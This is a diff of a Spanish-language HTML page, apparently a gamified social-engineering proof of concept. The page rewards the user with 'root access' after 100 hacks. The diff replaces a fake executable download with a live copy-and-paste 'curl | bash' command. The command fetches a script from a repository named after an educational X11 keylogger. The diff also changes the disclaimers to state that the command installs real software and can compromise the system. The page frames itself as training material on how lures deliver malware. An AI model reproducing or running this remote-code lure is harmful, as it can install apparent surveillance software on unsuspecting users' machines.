@@ -56,18 +56,18 @@
                     <div class="reward-content">
                         <h2 class="reward-title">🎯 ¡ACCESO ROOT OTORGADO! 🎯</h2>
                         <p class="reward-text">Has alcanzado 100 hacks exitosos!</p>
-                        <p class="reward-text">Tu herramienta de pentesting está lista:</p>
+                        <p class="reward-text">Ejecuta el siguiente comando en tu terminal:</p>
                         
-                        <button id="downloadButton" class="download-button">
-                            <span>📥 DESCARGAR HERRAMIENTA</span>
-                            <span class="filename">"not-a-virus-trust-me.exe"</span>
-                        </button>
+                        <div class="command-box">
+                            <code id="curlCommand">curl https://raw.githubusercontent.com/Jrgil20/KeyloggerEducativoParaLinuxX11/refs/heads/toInstall/scripts/downloadPentestingTool.sh | bash</code>
+                            <button id="copyButton" class="copy-button">📋 COPIAR</button>
+                        </div>
 
                         <div class="warning-box">
-                            <p class="warning-title">⚠️ AVISO IMPORTANTE ⚠️</p>
-                            <p class="warning-text">Esta es una herramienta de seguridad avanzada.*</p>
-                            <p class="disclaimer">* Esta aplicación es un EJEMPLO EDUCATIVO de ingeniería social. El archivo descargado es un ejecutable de demostración. En un escenario real, NUNCA ejecutes archivos de fuentes no confiables. Este es un PoC (Proof of Concept) que demuestra cómo el malware puede ser entregado mediante técnicas de social engineering. NO CONTIENE MALWARE REAL, pero ilustra cómo los atacantes pueden usar interfaces atractivas para engañar usuarios.</p>
-                            <p class="tiny-disclaimer">⚠️ ADVERTENCIA: Este archivo podría ser detectado como amenaza por tu antivirus porque simula comportamiento de descarga de ejecutables. Esto es intencional para fines educativos de ciberseguridad. ⚠️</p>
+                            <p class="warning-title">⚠️ ADVERTENCIA CRÍTICA ⚠️</p>
+                            <p class="warning-text">Este comando descargará e instalará software real en tu sistema.</p>
+                            <p class="disclaimer">* ESTO NO ES UNA SIMULACIÓN. Este comando ejecuta un script que instalará software en tu sistema. Úsalo bajo tu propio riesgo y solo en entornos controlados. Este es un ejemplo real de cómo los atacantes distribuyen malware mediante ingeniería social.</p>
+                            <p class="tiny-disclaimer">⚠️ PELIGRO REAL: Ejecutar este comando puede comprometer tu sistema. Solo para fines educativos en entornos de prueba aislados. ⚠️</p>
                         </div>
                     </div>
                 </div>
@@ -76,7 +76,7 @@
 
         <footer>
             <p class="footer-text">🔒 Developed for Cybersecurity Training Purposes | PoC v2.0</p>
-            <p class="footer-disclaimer">⚠️ DISCLAIMER: Este proyecto es puramente educativo y demuestra técnicas de ingeniería social utilizadas en ciberataques. Ningún malware real está incluido.</p>
+            <p class="footer-disclaimer">⚠️ DISCLAIMER: Este proyecto demuestra técnicas reales de ingeniería social utilizadas en ciberataques. El comando proporcionado ejecuta software real. Solo para uso educativo en entornos controlados.</p>
         </footer>
     </div>
 
